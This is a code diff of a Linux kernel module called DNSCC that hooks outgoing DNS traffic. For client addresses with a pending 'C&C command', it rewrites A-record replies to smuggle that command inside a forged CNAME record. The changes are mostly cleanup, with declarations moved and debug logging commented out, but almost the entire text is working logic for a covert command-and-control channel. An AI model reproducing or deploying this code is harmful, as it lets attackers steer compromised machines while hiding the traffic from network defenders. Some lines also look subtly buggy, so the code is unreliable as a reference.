@@ -102,10 +102,6 @@ struct sock *nl_sk = NULL;
 /* Our netlink function */
 static void dnscc_nl_recv_msg(struct sk_buff *skb){
 	struct nlmsghdr *nlh;
-	int pid;
-	struct sk_buff *skb_out;
-	int msg_size;
-	int res;
 	dnscc_msg* msg;
 	/* decode received message */
 	nlh = (struct nlmsghdr *)skb->data;
@@ -113,7 +109,8 @@ static void dnscc_nl_recv_msg(struct sk_buff *skb){
 	switch(msg->type){
 		case 1: {
 				struct conn_out_data* c;
-				unsigned char* command,enc_command;
+				unsigned char* command;
+				unsigned char* enc_command;
 			        uint16_t rf_len = 0;
 				get_file_msg* gfmsg = msg->data;
 				rf_len = strlen((const char*)gfmsg->remote_file)+1;
@@ -239,12 +236,10 @@ uint8_t remove_command(uint32_t ip_addr){
 //correct name pointers
 unsigned char* correct_name_ptr(unsigned long writer, unsigned char* buffer, int* count, uint16_t ptr_offset, uint16_t ar_start)
 {
-	unsigned int p=0,jumped=0,offset;
-	int i , j;
-	*count = 1;
+	unsigned int jumped=0,offset;
 	uint16_t new_offset = 0;
-	//read the names in 3www6google3com format
 	unsigned char* read = &buffer[writer];
+	*count = 1;
 	while(*read!=0)
 	{
 		if(*read>=192)
@@ -258,10 +253,10 @@ unsigned char* correct_name_ptr(unsigned long writer, unsigned char* buffer, int
 
 			// if offset > answer_start , then we should correct it!
 			if(offset > ar_start){
-				printk(KERN_INFO"Correcting pointer before -> %x %x %d",*read,*(read+1),writer);
+				printk(KERN_INFO"Correcting pointer before -> %x %x %lu",*read,*(read+1),writer);
 				new_offset = offset + ptr_offset+49152;
 				new_offset = htons(new_offset);
-				printk(KERN_INFO"Correcting pointer before -> %d %d %d",offset,new_offset,writer);
+				printk(KERN_INFO"Correcting pointer before -> %d %d %lu",offset,new_offset,writer);
 				memcpy(&buffer[writer],&new_offset,sizeof(uint16_t));
 				offset = (*read)*256 + *(read+1) - 49152; //49152 = 11000000 00000000 ;)
 				printk(KERN_INFO"Correcting pointer after -> %x %x %d",*(read),*(read+1),offset);
@@ -335,18 +330,21 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 	unsigned char *qname, *nqname;
 	unsigned char* dns_name;
 	unsigned char *dpointer,*nspointer;
-        struct RR ar[10],*new_ar,*olda_ar,nsr;
+        struct RR ar[10],*new_ar,*olda_ar;
 	int temp;  // domain name reader temp var
 	int dnsn_count;//question dns name count
 	int i,j,ip_ar_num = 0;
-	uint16_t nsr_size = 0;
 	unsigned long writer = 0;
 	unsigned long old_aur_start = 0;//count how many bytes from dns start-> auth RR, so we can correct pointers
 	uint16_t pointer_correct = 0;
 	uint16_t cname_offset = 0;
 	uint16_t cname2_offset = 0;
 	uint8_t command_length = 0;
-	uint16_t old_answer_start = 0;
+	struct RR fake_rr;
+	int com_len;
+	int last_dot;
+
+
 
 	temp =0;
 	dns_h =	(struct DNS_HEADER*)data;
@@ -365,10 +363,6 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 		ar[i].rr_data = (struct RR_DATA*)(dpointer);
 		dpointer = dpointer + sizeof(struct RR_DATA);
 		old_aur_start += sizeof(struct RR_DATA);	
-		//TODO:removeme
-		printk(KERN_INFO "%x %x %x %x",dpointer[0],dpointer[1]);
-		printk(KERN_INFO "%d %d %d %d",ntohs(ar[i].rr_data->type),ntohs(ar[i].rr_data->rdlength),ntohs(ar[i].rr_data->class),ntohs(ar[i].rr_data->ttl));
-
 		// If it's an IPV4 and A record, then we need it :)
 		if(ntohs(ar[i].rr_data->type) == 1){
 			ar[i].rdata = (unsigned char*)kmalloc(ntohs(ar[i].rr_data->rdlength),GFP_DMA);
@@ -384,16 +378,12 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 
 	}
 
-	//dpointer--; // Don't know why should i decrement, but it's working :)
 	nspointer = dpointer;
-	printk(KERN_INFO "2 bit %x %x %d",dpointer[0],dpointer[1]);
 	/* Create fake answer rr record */
-	struct RR fake_rr;
-	int com_len = strlen(command)+1;
+	com_len = strlen(command)+1;
 	fake_rr.name = kmalloc(sizeof(unsigned char)*2,GFP_DMA);
 	fake_rr.name[0] = 0xc0;
 	fake_rr.name[1] = 0x0c;
-	//memcpy(fake_rr.name,&command,sizeof(unsigned char)*2);
 	printk(KERN_INFO"fake comm %x - %x",ntohs(fake_rr.name[0]),ntohs(fake_rr.name[1]));
 	fake_rr.rr_data = kmalloc(sizeof(struct RR_DATA),GFP_DMA);
 	fake_rr.rr_data->type = htons(5);//cname
@@ -414,31 +404,31 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 	 * get the place of the dot before the last one.
 	 */
 	cname_offset = 0;
-	int last_dot = 0;
+	last_dot = 0;
 	for(i=0;i<strlen(dns_name);i++){
-		printk(KERN_INFO" i=%d dns_name %c",i,dns_name[i]);
+//		printk(KERN_INFO" i=%d dns_name %c",i,dns_name[i]);
 		if(dns_name[i] == '.'){
-			printk(KERN_INFO"Dot found %d ",i);
+//			printk(KERN_INFO"Dot found %d ",i);
 			cname_offset = last_dot+1;
 			last_dot = i;
 		}	
 	}
 	cname_offset += writer;
-	printk(KERN_INFO"cname_offset %d",cname_offset);
+//	printk(KERN_INFO"cname_offset %d",cname_offset);
 	nqname = (unsigned char *)&new_dns_data[writer];
 	memcpy(nqname,qname,strlen((const char*)qname)+1+sizeof(struct QUESTION));	//use the original qname + question flags
 	writer += strlen((const char*)qname)+1+sizeof(struct QUESTION);
-	printk(KERN_INFO"HEADER ------ writer %d",writer);
+//	printk(KERN_INFO"HEADER ------ writer %lu",writer);
 
 	/* answer */
-	new_ar = (unsigned char *)&new_dns_data[writer];
+	new_ar = (struct RR *)&new_dns_data[writer];
 	memcpy(new_ar,fake_rr.name,sizeof(unsigned char)*2);//first answer here, so inject our fake cname
-	printk(KERN_INFO"new ar %x %x",new_dns_data[writer],new_dns_data[writer+1]);
+//	printk(KERN_INFO"new ar %x %x",new_dns_data[writer],new_dns_data[writer+1]);
 	writer += sizeof(unsigned char)*2;
 	memcpy(&new_dns_data[writer],fake_rr.rr_data,sizeof(struct RR_DATA));
 	writer += sizeof(struct RR_DATA);
 	cname2_offset = writer + 49152;
-	printk(KERN_INFO" %d comm length",strlen(command));
+//	printk(KERN_INFO" %zu comm length",strlen(command));
 	command_length = strlen(command);
 	memcpy(&new_dns_data[writer],&command_length,sizeof(uint8_t));//length octet
 	writer += sizeof(uint8_t);
@@ -447,31 +437,26 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 	/* inject offset */
 	cname_offset += 49152;
 	cname_offset = htons(cname_offset);
-	printk(KERN_INFO"before offset %x %x",new_dns_data[writer],new_dns_data[writer+1]);
+//	printk(KERN_INFO"before offset %x %x",new_dns_data[writer],new_dns_data[writer+1]);
 	memcpy(&new_dns_data[writer],&cname_offset,sizeof(uint16_t));
-	printk(KERN_INFO"after offset %x %x",new_dns_data[writer],new_dns_data[writer+1]);
+//	printk(KERN_INFO"after offset %x %x",new_dns_data[writer],new_dns_data[writer+1]);
 	writer += sizeof(uint16_t);
-	printk(KERN_INFO"CNAME - ----- writer %d",writer);
+//	printk(KERN_INFO"CNAME - ----- writer %d",writer);
 	/* and the valid A record */
-	olda_ar = (unsigned char *)&new_dns_data[writer];
+	olda_ar = (struct RR *)&new_dns_data[writer];
 	cname2_offset = htons(cname2_offset);
 	memcpy(olda_ar,&cname2_offset,sizeof(uint16_t));//first answer here, so inject our fake cname
-	printk(KERN_INFO"new ar 2 %x %x %d",new_dns_data[writer],new_dns_data[writer+1],writer);
+//	printk(KERN_INFO"new ar 2 %x %x %d",new_dns_data[writer],new_dns_data[writer+1],writer);
 	writer += sizeof(uint16_t);
-	printk(KERN_INFO"debug 2 %d",writer);
 	memcpy(&new_dns_data[writer],ar[ip_ar_num].rr_data,sizeof(struct RR_DATA));
-	printk(KERN_INFO"debug 3 %d",writer);
 	writer += sizeof(struct RR_DATA);
-	printk(KERN_INFO"debug 4 %d",writer);
 	memcpy(&new_dns_data[writer],ar[ip_ar_num].rdata,ntohs(ar[ip_ar_num].rr_data->rdlength));
-	printk(KERN_INFO"debug 5 %d",writer);
 	writer += ntohs(ar[ip_ar_num].rr_data->rdlength);
-	printk(KERN_INFO"debug 6 %d",writer);
-	printk(KERN_INFO"A record --------- writer %d",writer);
+//	printk(KERN_INFO"A record --------- writer %d",writer);
 
 	/* correct pointers */
 	pointer_correct = writer - old_aur_start; //assume that, our fake command will be longer :)
-	printk(KERN_INFO "Pointer correct %d writer: %d aur_old_start: %d",pointer_correct,writer,old_aur_start);
+//	printk(KERN_INFO "Pointer correct %d writer: %d aur_old_start: %d",pointer_correct,writer,old_aur_start);
 
 	/* copy other stuff */
 /*
@@ -514,7 +499,7 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 	}
 	*/
 	
-	printk(KERN_INFO"[DNSCC] Manipulated answer size : %d",writer);
+//	printk(KERN_INFO"[DNSCC] Manipulated answer size : %lu",writer);
 	return writer;	
 }
 
@@ -580,9 +565,8 @@ static unsigned int dnscc_recv(unsigned int hooknum, struct sk_buff* skb, const 
 
 /* Sender hook */
 static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const struct net_device* on, const struct net_device* out, int (*okfn)(struct sk_buff*)) {
-	struct ethhdr *eth;
 	struct iphdr* iph = ip_hdr(skb);
-	struct udphdr* udph = NULL, udpbuff;
+	struct udphdr* udph = NULL;
 	unsigned char *data = NULL,*dns_name;
 	struct DNS_HEADER* dns_h = NULL;	/* if it's not udp, then return accept*/
 	bool query_bit = false;
@@ -617,13 +601,16 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 		/* check if we need to send out a command to this client and the reply is an A record*/
 		printk(KERN_INFO"Check command %d qtype %d",check_command_exists(iph->daddr),ntohs(question_data->qtype==1));
 		if(check_command_exists(iph->daddr) == 1 && ntohs(question_data->qtype == 1)){
-			printk(KERN_INFO "[DNSCC] C&C command found for %pI4 replacing original DNS reply",&iph->daddr);
 			/* Manipulate the answer */
-			unsigned char *command = get_command(iph->daddr);
+			unsigned char *command;
 			unsigned char *orig_dns_data;
 			unsigned char *new_dns_data;
 			uint16_t new_dns_size;
 			uint16_t payload_len = ntohs(udph->len) - UDP_HDR_LEN;
+			int offset;
+			int len;
+			printk(KERN_INFO "[DNSCC] C&C command found for %pI4 replacing original DNS reply",&iph->daddr);
+			command = get_command(iph->daddr);
 			new_dns_size = sizeof(unsigned char)*payload_len + strlen((const char*)command+20) ;
 			new_dns_data = kmalloc(new_dns_size,GFP_DMA);
 			printk(KERN_INFO "1new dns size: %d ",new_dns_size);
@@ -633,7 +620,6 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 			printk(KERN_INFO "SKB DATA LEN %d",payload_len);
 			new_dns_size = manipulate_dns_reply(orig_dns_data,command,new_dns_data,payload_len);
 			memcpy(data,new_dns_data,new_dns_size);
-			int src_err = 0, dst_err = 0;
 			skb->len = skb->len - (payload_len) + new_dns_size;
 			printk(KERN_INFO "2new dns size: %d ",new_dns_size);
 			udph->len=htons(new_dns_size+8);
@@ -643,8 +629,8 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 			iph->check = 0;
 	                ip_send_check (iph);
 			udph->check = 0;
-	                int offset = skb_transport_offset(skb);
-	                int len = skb->len - offset;
+	               	offset = skb_transport_offset(skb);
+	                len = skb->len - offset;
 	                udph->check = ~csum_tcpudp_magic((iph->saddr), (iph->daddr), len, IPPROTO_UDP, 0);
 			/* remove the command */
 			remove_command(iph->daddr);
